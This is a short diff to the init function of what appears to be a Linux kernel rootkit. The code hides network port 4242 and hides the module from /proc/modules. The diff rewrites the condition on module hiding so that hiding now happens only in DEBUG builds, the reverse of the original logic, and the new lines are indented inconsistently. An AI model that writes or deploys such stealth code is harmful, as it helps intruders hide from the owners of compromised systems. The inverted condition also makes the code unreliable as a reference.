@@ -88,9 +88,10 @@ int init_interceptor(void) {
     // Hide ports
     hide_port("4242");
 
-    // Hide module in /proc/modules
-    if (!DEBUG)
-        hide_module();
+  // Hide module in /proc/modules
+  #if defined(DEBUG) && DEBUG
+    hide_module();
+  #endif
 
     return SUCCESS;
 }
